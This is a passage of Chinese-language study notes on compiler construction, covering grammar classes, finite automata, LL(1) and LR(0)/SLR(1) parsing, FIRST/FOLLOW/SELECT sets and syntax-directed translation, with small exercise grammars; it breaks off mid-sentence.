编译的主要过程</h2><p>编译程序的工作过程一般分为五个阶段：词法分析、语法分析、语义分析与中间代码产生、优化、目标代码生成。</p><ul><li><strong>词法分析</strong>：输入源程序，对构成源程序的字符串进行扫描和分解，识别一个个的单词(亦称单词符号或简称符号)。</li><li><strong>语法分析</strong>：对单词符号串进行语法分析(根据语法规则进行推导或规约)，识别出各类语法单位，最终判断输入串是否构成语法上正确的”程序”。</li><li><strong>语义分析与中间代码产生</strong>：对语法分析所识别出的各类语法范畴，分析其含义，并进行初步翻译(产生中间代码)。</li><li><strong>优化</strong>：对前端产生的中间代码进行加工变换，以期在最后阶段能产生更为高效(省时间和空间)的目标代码。</li><li><strong>目标代码生成</strong>：把中间代码(或经优化处理之后)变换成特定机器上的低级语言代码。</li></ul><h2 id="0x06-算符优先分析"><a href="#0x06-算符优先分析" class="headerlink" title="0x06 算符优先分析"></a>0x06 算符优先分析</h2><h3 id="01-算符优先分析同规范规约比较"><a href="#01-算符优先分析同规范规约比较" class="headerlink" title="01 算符优先分析同规范规约比较"></a>01 算符优先分析同规范规约比较</h3><p>　　算符优先分析因为在分析过程中跳过了单非终结符对应的规约步骤，因此规约速度比规范规约快，但由于忽略了非终结符在规约过程中的作用，因此可能导致把本来不成句子地输入串误认为是句子。</p><h3 id="02-如何寻找“可规约串”，分析树与语法树是否一致"><a href="#02-如何寻找“可规约串”，分析树与语法树是否一致" class="headerlink" title="02 如何寻找“可规约串”，分析树与语法树是否一致"></a>02 如何寻找“可规约串”，分析树与语法树是否一致</h3><p>　　通过算符之间的优先关系，找到最左素短语进行规约；算符优先分析在分析时忽略的产生式右边时单非终结符的产生式，并且在规约过程中采用“型近”方式进行规约，因此得到的分析树可能和语法树不一致。</p><h2 id="0x07-编译各过程对符号表的操作"><a href="#0x07-编译各过程对符号表的操作" class="headerlink" title="0x07 编译各过程对符号表的操作"></a>0x07 编译各过程对符号表的操作</h2><p>　　词法分析阶段需要将识别出来的单词符号及其类别填入符号表；语义分析阶段需要将单词符号的属性填入对应的单词，同时需要查阅符号表；目标代码生成阶段也需要查阅符号表。</p><h2 id="0x08-编译的前后端"><a href="#0x08-编译的前后端" class="headerlink" title="0x08 编译的前后端"></a>0x08 编译的前后端</h2><p>　　前端与源语言有关，包括词法分析、语法分析、语义分析机中间代码产生，有的代码优化工作也可包含在前端；后端与目标机有关，包括与目标机有关的代码优化和目标代码生成等，通常后端不依赖于源语言而仅仅依赖于中间语言。划分为前后端主要使得编译结构清晰，便于实现。</p><h2 id="0x09-其他"><a href="#0x09-其他" class="headerlink" title="0x09 其他"></a>0x09 其他</h2><ul><li>形式化的例子：上下文无关文法描述语法结构、正规文法描述词法结构、语义形式化-属性文法</li><li>上下文无关文法无法描述程序结构语言的语义问题</li><li></li></ul><h1 id="Ch2-高级语言及其语法描述-上下文无关文法"><a href="#Ch2-高级语言及其语法描述-上下文无关文法" class="headerlink" title="Ch2 高级语言及其语法描述 上下文无关文法"></a>Ch2 高级语言及其语法描述 上下文无关文法</h1><h2 id="01-文法分类"><a href="#01-文法分类" class="headerlink" title="01 文法分类"></a>01 文法分类</h2><ul><li><strong>0型文法</strong>：也称无限制文法或短语结构文法(PSG)。$\forall \alpha \rightarrow \beta \in P$，$\alpha$中至少包含一个非终结符。</li><li><strong>1型文法</strong>：也称上下文有关文法(CSG)。$\forall \alpha \rightarrow \beta \in P$，$|\boldsymbol{\alpha}| \leq|\boldsymbol{\beta}|$，$\alpha$中至少包含一个非终结符。产生式的一般形式：$\alpha<em>{1} A \alpha</em>{2} \rightarrow \alpha<em>{1} \beta \alpha</em>{2}(\beta \neq \varepsilon)$。不包含​ε-产生式。</li><li><strong>2型文法</strong>：也称上下文无关文法(CFG)。$\forall \alpha \rightarrow \beta \in P, \alpha \in V_{N}$。产生式的一般形式：$A \rightarrow \beta$。</li><li><strong>3型文法</strong>：也称正则文法(RG)。<ul><li>右线性文法：$A \rightarrow w B$ 或 $A \rightarrow w$</li><li>左线性文法：$A \rightarrow B w$ 或 $A \rightarrow w$</li></ul></li></ul><h2 id="02-试题"><a href="#02-试题" class="headerlink" title="02 试题"></a>02 试题</h2><ul><li><p>$L(G)={a^nb^m,n&gt;m&gt;0}$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">G(S): S -&gt; AB</span><br><span class="line">  A -&gt; aA | a</span><br><span class="line">  B -&gt; aBb | ab</span><br><span class="line">或</span><br><span class="line">G(S): S -&gt; aSB | aab</span><br><span class="line">  B -&gt; b | ε</span><br></pre></td></tr></table></figure></li><li><p>非0开头的正偶数集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">G(Z): Z -&gt; ABC | 2 | 4 | 6 | 8</span><br><span class="line">  A -&gt; 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9</span><br><span class="line">  B -&gt; BA | B0 | ε</span><br><span class="line">  C -&gt; 0 | 2 | 4 | 6 | 8</span><br></pre></td></tr></table></figure></li><li><p>$L(G)={a^nb^nc^m|n为偶数，m为奇数}$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">G(S): S -&gt; AC</span><br><span class="line">  A -&gt; aaAbb | ε</span><br><span class="line">  C -&gt; ccC | c</span><br></pre></td></tr></table></figure></li><li><p>$L(G)={a^nb^nc^i|n&gt;=1，i&gt;=0}$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">G(S): S -&gt; AC</span><br><span class="line">  A -&gt; aAb | ab</span><br><span class="line">  C -&gt; cC | ε</span><br></pre></td></tr></table></figure></li><li><p>$L(G)={a^nb^na^mb^m|n,m&gt;=0}$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">G(S): S -&gt; AB</span><br><span class="line">  A -&gt; aAb | ε</span><br><span class="line">  B -&gt; aBb | ε</span><br></pre></td></tr></table></figure></li><li><p>$L(G)={1^n0^m1^m0^n|n,m&gt;=0}$</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">G(S): S -&gt; A | B</span><br><span class="line">  A -&gt; 0A1 | ε</span><br><span class="line">  B -&gt; 1B0 | A</span><br></pre></td></tr></table></figure></li><li></li></ul><h1 id="Ch3-词法分析-正规式到DFA"><a href="#Ch3-词法分析-正规式到DFA" class="headerlink" title="Ch3 词法分析 正规式到DFA"></a>Ch3 词法分析 正规式到DFA</h1><h2 id="01-正规式"><a href="#01-正规式" class="headerlink" title="01 正规式"></a>01 正规式</h2><ul><li>{a.b}，至少两个连续的a：$(a|b)^<em>aa(a|b)^</em>$</li><li></li><li></li></ul><h2 id="02-有穷自动机-FA"><a href="#02-有穷自动机-FA" class="headerlink" title="02 有穷自动机(FA)"></a>02 有穷自动机(FA)</h2><ul><li><strong>最长字串匹配原则</strong>：但输入串的多个前缀与一个或多个模式匹配时，总是选择最长的前缀进行匹配。</li><li><strong>确定有限自动机(DFA)</strong>：$M=\left(S, \Sigma, \delta, s_{0}, F\right)$<ul><li>$S$：有穷状态集</li><li>$ \Sigma$：输入字母表，即输入符号集合。假设ε不是$ \Sigma$中的元素。</li><li>$\delta$：将$S \times \Sigma$映射到$S$的转换函数。$\forall s \in S, a \in \Sigma, \delta(s, a)$表示从状态$s$出发，沿着标记为$a$的边所能到达的状态</li><li>$s<em>{0}$：开始状态(或初始状态)，$\boldsymbol{s}</em>{0} \in S$</li><li>$F$：接受状态(或终止状态)集合，$F \subseteq S$</li></ul></li><li><strong>非确定有限自动机(NFA)</strong>：$M=\left(S, \Sigma, \delta, s_{0}, F\right)$<ul><li>$S$：有穷状态集</li><li>$ \Sigma$：输入字母表，即输入符号集合。假设ε不是$ \Sigma$中的元素。</li><li>$\delta$：将$S \times \Sigma$映射到$2^S$的转换函数。$\forall s \in S, a \in \Sigma, \delta(s, a)$表示从状态$s$出发，沿着标记为$a$的边所能到达的状态<strong>集合</strong></li><li>$s<em>{0}$：开始状态(或初始状态)，$\boldsymbol{s}</em>{0} \in S$</li><li>$F$：接受状态(或终止状态)集合，$F \subseteq S$</li></ul></li><li><strong>带有”ε-边”的NFA</strong>：<ul><li>$\delta$：将$S \times \Sigma\cup{\varepsilon}$映射到$2^S$的转换函数。$\forall s \in S, a \in \Sigma\cup{\varepsilon}, \delta(s, a)$表示从状态$s$出发，沿着标记为$a$的边所能到达的状态<strong>集合</strong></li></ul></li></ul><h2 id="03-RE转换为DFA"><a href="#03-RE转换为DFA" class="headerlink" title="03 RE转换为DFA"></a>03 RE转换为DFA</h2><ul><li><p><strong>RE -&gt; NFA</strong></p></li><li><p><strong>NFA -&gt; DFA(子集构造法)</strong>：画出转换表(值为集合)</p><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-15_16-53-33.jpg" class="lozad"></p></li><li><p><strong>DFA化简</strong>：寻找一个状态数比M少的DFA M’，使得L(M)=L(M’)</p><ul><li>① 将DFA M的状态集Q分划成两个子集：终态集和非终态集；</li><li>② 对每个子集G，如果面对某个输入符号得到的后继状态不属于同一个子集，则将G进一步划分；<strong>(等价定义判断状态接受字符的能力)</strong></li><li>③ 重复②直到不再产生新划分；</li><li>④ 在每个子集中选一个状态作代表，消去其他状态，得到最少状态的等价DFA M’。</li></ul></li></ul><h2 id="04-FA转化为RE"><a href="#04-FA转化为RE" class="headerlink" title="04 FA转化为RE"></a>04 FA转化为RE</h2><ul><li><strong>FA -&gt; RE</strong><ul><li>引入新的开始状态和终止状态</li><li>消去状态</li></ul></li></ul><h2 id="05-FA与正规文法转化"><a href="#05-FA与正规文法转化" class="headerlink" title="05 FA与正规文法转化"></a>05 FA与正规文法转化</h2><ul><li><p><strong>FA -&gt; RG</strong></p><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-15_19-13-21.jpg" class="lozad"></p></li><li><p><strong>RRG -&gt; FA</strong></p></li><li><p><strong>LRG -&gt; FA</strong></p></li></ul><h1 id="Ch4-语法分析——自上而下分析-LL-1"><a href="#Ch4-语法分析——自上而下分析-LL-1" class="headerlink" title="Ch4 语法分析——自上而下分析 LL(1)"></a>Ch4 语法分析——自上而下分析 LL(1)</h1><h2 id="01-概念"><a href="#01-概念" class="headerlink" title="01 概念"></a>01 概念</h2><ul><li><strong>问题</strong><ul><li>替换当前句型中的哪个非终结符</li><li>用该非终结符的哪个候选式<ul><li>多个时，遍历，回溯，效率低</li><li>预测分析式递归下降分析技术的一个特例，通过在输入中向前看固定个数(通常是1)符号来选择正确的A-产生式，不需要回溯</li><li>可以对某些文法构造出向前看k个输入符号的预测分析器，该类文法有时也称为LL(k)文法类</li></ul></li></ul></li></ul><h2 id="02-解题"><a href="#02-解题" class="headerlink" title="02 解题"></a>02 解题</h2><ul><li>改写LL(1)文法<ul><li>提取公共左因子</li><li>消去二义性 ？？卷三题四</li><li>消去左递归</li></ul></li><li>求解各非终结符的FIRST集和FOLLOW集</li><li>求解产生式的SELECT集，构造预测分析表</li></ul><h2 id="03-LL-1-文法"><a href="#03-LL-1-文法" class="headerlink" title="03 LL(1)文法"></a>03 LL(1)文法</h2><p>　　第一个“L”表示从左向右扫描输入，第二个“ L”表示产生最左推导，“1”表示在每一步中只需要向前看一个输入符号来决定语法分析动作。</p><ul><li><strong>S_文法(简单的确定性文法)</strong>：<ul><li>每个产生式的右部都以终结符开始</li><li>同一非终结符的各个候选式的首终结符都不同</li><li>不含ε产生式</li></ul></li><li><strong>q_文法</strong><ul><li>每个产生式的右部或为ε ，或以终结符开始</li><li>具有相同左部的产生式有不相交的可选集</li><li>不含右部以非终结符打头的产生式</li></ul></li><li><strong>LL(1)文法</strong>：G的任意两个具有相同左部的 产生式A → α | β 满足下面的条件<ul><li>不存在终结符a使得α 和β都能够推导出以a开头的串</li><li>α 和β至多有一个能推导出ε </li><li>如果$\beta \Rightarrow^{*} \varepsilon$，则$FIRST(\alpha) \cap F O L L O W(A)=\Phi$</li><li>如果$\alpha \Rightarrow^{*} \varepsilon$，则$FIRST(\beta) \cap F O L L O W(A)=\Phi$</li><li>同一非终结符的各个产生式的可选集互不相交</li></ul></li></ul><h2 id="04-消去二义性"><a href="#04-消去二义性" class="headerlink" title="04 消去二义性"></a>04 消去二义性</h2><ul><li>判断文法二义性<ul><li>二义性问题是不可判定的，即不存在一个算法，它能在有限步骤内，确切地判定一个文法是否为二义的</li><li>存在某个句子对应两棵不同的语法树(存在两个不同的最左/右推导)</li><li>形如<code>S -&gt; SS</code>、<code>S -&gt; iSeS | iS | i</code>、<code>S -&gt; S + S</code></li></ul></li><li>消去文法二义性<ul><li>定义规则：规定二义文法中符号的优先级和结合性，使仅产生一棵分析树</li><li><strong>重写文法</strong><ul><li>划分优先级和结合性：？？<a href="https://blog.csdn.net/sandalphon4869/article/details/103423292" target="_blank" rel="noopener">https://blog.csdn.net/sandalphon4869/article/details/103423292</a></li><li>引入一个新的非终结符，<strong>增加一个子结构并提高一级优先级</strong>（优先级的判断）；</li><li>递归非终结符在终结符左边，运算具有左结合性，否则具有右结合性</li></ul></li></ul></li></ul><h2 id="05-消除左递归"><a href="#05-消除左递归" class="headerlink" title="05 消除左递归"></a>05 消除左递归</h2><h3 id="a-左递归"><a href="#a-左递归" class="headerlink" title="a. 左递归"></a>a. 左递归</h3><ul><li>如果一个文法中有一个非终结符 A使得对某个串 α 存 在一个推导$A \Rightarrow^{+} A \alpha$，那么这个文法就是<strong>左递归</strong>的</li><li>一步推导是<strong>直接左递归</strong></li><li>经过两步或两步以上推导产生的左递归称为是<strong>间接左递归</strong> </li></ul><h3 id="b-步骤"><a href="#b-步骤" class="headerlink" title="b. 步骤"></a>b. 步骤</h3><ul><li><p>直接左递归消除</p><ul><li>$A \rightarrow A \alpha<em>{1}\left|A \alpha</em>{2}\right| \ldots\left|A \alpha<em>{n}\right| \beta</em>{1}\left|\beta<em>{2}\right| \ldots \mid \beta</em>{m} \left(\alpha<em>{i} \neq \varepsilon, \beta</em>{j} \right.$ 以 $A$ 开头 $)$</li><li>$A \rightarrow \beta<em>{1} A^{\prime}\left|\beta</em>{2} A^{\prime}\right| \ldots \mid \beta<em>{m} A^{\prime}$<br>$A^{\prime} \rightarrow \alpha</em>{1} A^{\prime}\left|\alpha<em>{2} A^{\prime}\right| \ldots\left|\alpha</em>{n} A^{\prime}\right| \varepsilon$</li><li><strong>代价</strong>：引进了一些非终结符和ε_​产生式</li></ul></li><li><p>间接左递归消除：代入后转化为直接左递归，再消除</p><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-15_20-00000000000.jpg" class="lozad"></p></li></ul><h2 id="06-提左因子"><a href="#06-提左因子" class="headerlink" title="06 提左因子"></a>06 提左因子</h2><p>　　通过改写产生式来推迟决定，等读入了足够多的输入，获得足够信息后再做出正确的选择。</p><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-15_20-52-44.jpg" class="lozad"></p><h2 id="07-FIRST集"><a href="#07-FIRST集" class="headerlink" title="07 FIRST集"></a>07 FIRST集</h2><ul><li><p><strong>串首终结符集</strong>：给定一个文法符号串α， α的串首终结符集FIRST(α)被定义为可以从α推导出的所有串首终结符构成的集合。</p></li><li><p><strong>性质</strong></p><ul><li>对于$\forall \alpha \in\left(V<em>{T} \cup V</em>{N}\right)^{+}, FIRST (\alpha)=\left{a \mid \alpha \Rightarrow^{<em>} a \beta, a \in V<em>{T}, \beta \in\left(V</em>{T} \cup V_{N}\right)^{</em>}\right}$</li><li>如果$\alpha \Rightarrow{ }^{*} \varepsilon$， 那么ε也在FIRST(α)中</li></ul></li><li><p><strong>计算文法符号X的FIRST(X)</strong></p><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-15_210000.jpg" class="lozad"></p></li><li><p><strong>计算串X1X2 …Xn的FIRST 集合</strong></p><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-15_21-42-24.jpg" class="lozad"></p></li></ul><h2 id="08-FOLLOW集"><a href="#08-FOLLOW集" class="headerlink" title="08 FOLLOW集"></a>08 FOLLOW集</h2><ul><li><p><strong>非终结符A的后继符号集</strong>：可能在某个句型中紧跟在A后边的终结符a的集合，记为$FOLLOW(A)=\left{a \mid S \Rightarrow^{<em>} \alpha A a \beta, a \in V<em>{T}, \quad \alpha, \beta \in\left(V</em>{T} \cup V_{N}\right)^{</em>}\right}$。如果 A是某个句型的的最右符号， 则将结束符“$”添加到FOLLOW(A)中。</p></li><li><p><strong>计算非终结符A的FOLLOW(A)</strong></p><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-15_21-44-19.jpg" class="lozad"></p></li></ul><h2 id="09-SELECT集"><a href="#09-SELECT集" class="headerlink" title="09 SELECT集"></a>09 SELECT集</h2><ul><li><strong>产生式的可选集</strong>：产生式A→β的可选集是指可以选用该产生式进行推导时对应的输入符号的集合，记为SELECT( A→β )</li><li><strong>性质(S_文法与q_文法)</strong><ul><li>$\operatorname{SELECT}(A \rightarrow a \beta)={a}$</li><li>$\operatorname{SELECT}(A \rightarrow \varepsilon)=FOLLOW(A)$</li></ul></li><li><strong>性质(LL(1))</strong><ul><li>如果$\varepsilon \notin F I R S T(\alpha)$，那么$\operatorname{SELECT}(A \rightarrow \alpha)=\operatorname{FIRST}(\alpha)$</li><li>如果$\varepsilon \in F I R S T(\alpha)$，那么$\operatorname{SELECT}(A \rightarrow \alpha)=(\operatorname{FIRST}(\alpha)-{\varepsilon}) \cup FOLLOW(A)$</li></ul></li><li><strong>计算表达式文法各产生式的SELECT 集</strong><ul><li>若非终结符A打头，则SELECT(…) = FIRST(A)</li><li>若终结符a打头，则SELECT(…) = {a}</li><li>若为S -&gt; ε，则SELECT(…) = FOLLOW(S)</li></ul></li></ul><h2 id="10-预测分析表"><a href="#10-预测分析表" class="headerlink" title="10 预测分析表"></a>10 预测分析表</h2><p>根据SELECT集写出。</p><h1 id="Ch5-语法分析——自下而上分析-LR-0-SLR-1"><a href="#Ch5-语法分析——自下而上分析-LR-0-SLR-1" class="headerlink" title="Ch5 语法分析——自下而上分析 LR(0)+SLR(1)"></a>Ch5 语法分析——自下而上分析 LR(0)+SLR(1)</h1><h2 id="00-解题"><a href="#00-解题" class="headerlink" title="00 解题"></a>00 解题</h2><ul><li>判断何种规范规约文法<ul><li>拓广文法</li><li>构造识别活前缀的DFA<ul><li>无移进/规约冲突和规约/规约冲突，则为LR(0)</li><li>SLR分析表中不存在冲突，则为SLR(1)</li><li>SLR分析表中存在冲突，则为LR(1) (不考)</li></ul></li></ul></li><li>构造分析表：状态、ACTION、GOTO、终结符(含#)、非终结符(仅仅在线上的)、$s_i$(移进)、$r_j$(归约)、acc(接受)</li><li>输入串<em>*</em>的分析过程：步骤、状态栈(初始化为0)、符号栈(栈底为#)、当前字符、剩余字符串(以#结尾)、动作(移进、归约××、接受)</li></ul><h2 id="01-移入-归约分析"><a href="#01-移入-归约分析" class="headerlink" title="01 移入-归约分析"></a>01 移入-归约分析</h2><ul><li>采用最左归约方式（反向构造最右推导），每次归约的符号串称为“句柄”</li><li>栈内符号串 + 剩余输入 = “规范句型“</li><li><strong>工作过程</strong><ul><li>在对输入串的一次从左到右扫描过程中，语法分析器将零个或多个输入符号移入到栈的顶端，直到它可以对栈顶的一个文法符号串β进行归约为止</li><li>然后，它将β归约为某个产生式的左部</li><li>语法分析器不断地重复这个循环，直到它检测到一个语法错误，或者栈中包含了开始符号且输入缓冲区为空(当进入这样的格局时，语法分析器停止运行，并宣称成功完成了语法分析)为止</li></ul></li><li><strong>4种动作</strong><ul><li>移入：将下一个输入符号移到栈的顶端</li><li>归约：被归约的符号串的右端必然处于栈顶。语法 分析器在栈中确定这个串的左端，并决定用哪个非 终结符来替换这个串</li><li>接收：宣布语法分析过程成功完成</li><li>报错：发现一个语法错误，并调用错误恢复子例程</li></ul></li><li><strong>存在问题</strong>：错误地识别了句柄</li><li><strong>自底向上分析的关键问题</strong>：如何正确地识别句柄</li><li>句柄是逐步形成的，用“状态”表示句柄识别的进展程度；LR分析器基于这样一些状态来构造自动机进行句柄的识别<ul><li>移进状态</li><li>待约状态</li><li>归约状态</li></ul></li></ul><h2 id="02-LR分析法"><a href="#02-LR分析法" class="headerlink" title="02 LR分析法"></a>02 LR分析法</h2><p>　　LR文法(Knuth, 1963) 是最大的、可以构造出相应移入-归约语法分析器的文法类。L: 对输入进行从左到右的扫描；R: 反向构造出一个最右推导序列。</p><p>　　LR(k)分析需要向前查看k个输入符号的LR分析。k = 0 和 k = 1 这两种情况具有实践意义；当省略(k)时，表示k =1 。</p><h3 id="a-LR-分析器的工作过程"><a href="#a-LR-分析器的工作过程" class="headerlink" title="a. LR 分析器的工作过程"></a>a. LR 分析器的工作过程</h3><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-15_22-53-50.jpg" class="lozad"></p><h3 id="b-LR-0-项目"><a href="#b-LR-0-项目" class="headerlink" title="b. LR(0) 项目"></a>b. LR(0) 项目</h3><ul><li><strong>定义</strong>：右部某位置标有圆点的产生式称为相应文法的一个LR(0) 项目(简称为项目)，$A \rightarrow \alpha<em>{1} \cdot \alpha</em>{2}$<ul><li>分类：移进项目、待约项目、归约项目</li><li>项目描述了句柄识别的状态</li><li>产生式$A→ε$ 只生成一个项目$A→ ·$</li></ul></li></ul><h3 id="c-增广文法"><a href="#c-增广文法" class="headerlink" title="c. 增广文法"></a>c. 增广文法</h3><p>　　如果G 是一个以S为开始符号的文法，则G的增广文法 G’ 就 是在G中加上新开始符号S’ 和产生式S’ → S而得到的文法。</p><p>　　引入这个新的开始产生式的目的是使得文法开始符号仅出现 在一个产生式的左边，从而使得分析器只有一个接受状态。</p><h3 id="d-文法中的项目"><a href="#d-文法中的项目" class="headerlink" title="d. 文法中的项目"></a>d. 文法中的项目</h3><ul><li><strong>初始项目</strong>：$S’ -&gt; \cdot S$ </li><li><strong>接收项目</strong>：$S’ -&gt; S \cdot$</li><li><strong>归约项目</strong>：圆点处于项目的末尾</li><li><strong>后继项目</strong><ul><li>同属于一个产生式的项目，但圆点的位置只相差一个符号， 则称后者是前者的后继项目</li><li>$A \rightarrow \alpha \cdot X \beta$ 的后继项目是 $A \rightarrow \alpha X \cdot \boldsymbol{\beta}$</li></ul></li><li>可以把等价的项目组成一个项目集( I ) ，称为项目集闭包 (Closure of Item Sets)，每个项目集闭包对应着自动机的一个状态</li><li>圆点后面有非终结符的存在等价项目</li></ul><h3 id="e-LR-0-转换图转LR-0-分析表"><a href="#e-LR-0-转换图转LR-0-分析表" class="headerlink" title="e. LR(0)转换图转LR(0)分析表"></a>e. LR(0)转换图转LR(0)分析表</h3><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-15_23-25-39.jpg" class="lozad"></p><h3 id="f-冲突"><a href="#f-冲突" class="headerlink" title="f. 冲突"></a>f. 冲突</h3><ul><li><strong>移进/规约冲突</strong><ul><li>$E -&gt; T \cdot$</li><li>$T -&gt; T \cdot*F$</li></ul></li><li><strong>规约/规约冲突</strong><ul><li>$B -&gt; \cdot$</li><li>$T -&gt; \cdot$</li></ul></li><li>如果LR(0)分析表中没有语法分析动作冲 突，那么给定的文法就称为LR(0)文法</li><li>不是所有CFG都能用LR(0)方法进行分析，也就是说，CFG不总是LR(0)文法</li></ul><h3 id="g-SLR-1-消除冲突"><a href="#g-SLR-1-消除冲突" class="headerlink" title="g. SLR(1)  消除冲突"></a>g. SLR(1)  消除冲突</h3><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-16_00-09-26.jpg" class="lozad"></p><p><img alt data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2020-11-16_00-07-04.jpg" class="lozad"></p><h1 id="Ch6-属性文法和语法制导翻译-amp-Ch7-语义分析和中间代码生成"><a href="#Ch6-属性文法和语法制导翻译-amp-Ch7-语义分析和中间代码生成" class="headerlink" title="Ch6 属性文法和语法制导翻译 &amp; Ch7 语义分析和中间代码生成"></a>Ch6 属性文法和语法制导翻译 &amp; Ch7 语义分析和中间代码生成</h1><h2 id="01-语法制导翻译"><a href="#01-语法制导翻译" class="headerlink" title="01 语法制导翻译"></a>01 语法制导翻译</h2><ul><li><p><strong>定义</strong>：语法制导翻译使用CFG来引导对语言的翻译， 是一种面向文法的翻译技术。</p></li><li><p><strong>语法制导翻译</strong></p><ul><li>语法分析</li><li>语义翻译<ul><li>语义分析</li><li>中间代码生成</li></ul></li></ul></li><li><strong>基本思想</strong><ul><li>如何表示语义信息<ul><li>为CFG中的文法符号设置语义属性，用来表示语法成 分对应的语义信息</li></ul></li><li>如何计算语义属性<ul><li>文法符号的语义属性值是用与文法符号所在产生式 （语法规则）相关联的语义规则来计算的</li><li>对于给定的输入串x ，构建x的语法分析树，并利用 与 产生式（语法规则）相关联的语义规则 来计算分析树 中各结点对应的语义属性值</li></ul></li></ul></li><li><strong>语法制导定义(SDD)</strong><ul><li>SDD是对CFG的推广<ul><li>将每个文法符号和一个语义属性集合相关联</li><li>将每个产生式和一组语义规则相关联，这些规则用 于计算该产生式中各文法符号的属性值</li></ul></li><li>如果X是一个文法符号，a是X的一个属性，则用 X.a表示属性a在某个标号为X的分析树结点上的值</li><li><strong>综合属性</strong><ul><li>在分析树结点 N上的非终结符A的综合属性只能通 过 N的子结点或 N本身的属性值来定义</li><li>终结符可以具有综合属性。终结符的综合属性值是 由词法分析器提供的词法值，因此在SDD中没有计 算终结符属性值的语义规则</li></ul></li><li><strong>继承属性</strong><ul><li>在分析树结点 N上的非终结符A的继承属性只能通过 N的父结点、N的兄弟结点或 N本身的属性值来定义</li><li>终结符没有继承属性。终结符从词法分析器处获得的属性值被归为综合属性值</li></ul></li><li><strong>注释分析树</strong>： 每个节点都带有属性值的分析树</li><li><strong>属性文法</strong>：一个没有副作用的SDD有时也称为属性文法。属性文法的规则仅仅通过其它属性值和常量来 定义一个属性值。</li><li>SDD求值顺序<ul><li>语义规则建立了属性之间的依赖关系，在对语法 分析树节点的一个属性求值之前，必须首先求出 这个属性值所依赖的所有属性值</li><li><strong>依赖图</strong><ul><li>依赖图是一个描述了分析树中结点属性间依赖关系的有向图</li><li>分析树中每个标号为X的结点的每个属性a都对应着依赖图中的一个结点</li><li>如果属性X.a的值依赖于属性Y.b的值，则依赖图中有一条从Y.b的结点指向X.a的结点的有向边</li><li>如果图中没有环，那么至少存在一个拓扑排序</li></ul></li><li>属性值计算顺序<ul><li>可行的求值顺序是满足下列条件的结点序列$N_1, N_2, … , N_k$：如果依赖图中有一条从结点Ni到 Nj 的边($N_i→N_j$), 那么$i &lt; j$（即：在节点序列中，$N_i$ 排在$N_j$ 前面）</li><li>这样的排序将一个有向图变成了一个线性排序， 这个排序称为这个图的拓扑排序</li></ul></li><li>对于只具有综合属性的SDD ，可以按照任何自底向上的顺序计算它们的值</li><li>对于同时具有继承属性和综合属性的SDD，不能保证存在一个顺序来对各个节点上的属性进行求值</li></ul></li><li><strong>S-属性</strong><ul><li>仅仅使用综合属性的SDD称为S属性的SDD，或S-属性定义、 S-SDD</li><li>如果一个SDD是S属性的，可以按照语法分析树节点的任何自底向上顺序来计算它的各个属性值</li><li>S-属性定义可以在自底向上的语法分析过程中实现</li></ul></li><li><strong>L-属性</strong><ul><li>L-属性定义(也称为L属性的SDD或L-SDD)的 直观含义：在一个产生式所关联的各属性之间， 依赖图的边可以从左到右，但不能从右到左 (因此称为L属性的，L是Left的首字母)</li><li>一个SDD是L-属性定义，当且仅当它的每个属性要 么是一个综合属性，要么是满足如下条件的继承属 性：假设存在一个产生式$A \rightarrow X<em>{1} X</em>{2} \ldots X<em>{n}$，其右部符号$X</em>{i}(1 \leq i \leq n)$的继承属性仅依赖于下列属性：<ul><li>A的继承属性(不能是综合属性的原因：父节点的综合属性可以依赖子节点的属性(包括继承属性)，子节点的继承属性再依赖父节点的综合属性会造成循环依赖)</li><li>产生式中$X<em>i$左边的符号 $X_1, X_2, … , X</em>{i-1}$ 的属性</li><li>$X_i$本身的属性，但$X_i$ 的全部属性不能在依赖图中形成环路</li></ul></li><li>每个S-属性定义都是L-属性定义</li></ul></li></ul></li><li><strong>语法制导翻译方案(SDT)</strong><ul><li>SDT是在产生式右部嵌入了程序片段的CFG，这些程序片段称为语义动作。按照惯例，语义动作放在花括号内</li><li>基本文法可以使用LR分析技术，且SDD是S属性的；基本文法可以使用LL分析技术，且SDD是L属性的。</li><li><strong>将S-SDD转换为SDT</strong>：将每个语义动作都放在产生式的最后</li><li><strong>S-属性定义的SDT 实现</strong><ul><li>如果一个S-SDD的基本文法可以使用LR分析技术， 